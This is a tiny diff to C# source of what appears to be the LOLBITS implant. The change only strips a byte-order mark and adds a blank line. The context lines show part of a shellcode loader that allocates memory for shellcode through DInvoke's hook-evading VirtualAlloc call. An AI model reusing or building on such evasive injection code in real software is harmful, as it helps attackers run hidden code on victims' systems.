@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -200,6 +200,7 @@ namespace LOLBITS.Controlling
 
                 object[] virtualAlloc3 = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                                           DInvoke.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };
+              
                 shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
                                                                                         typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc3);
 
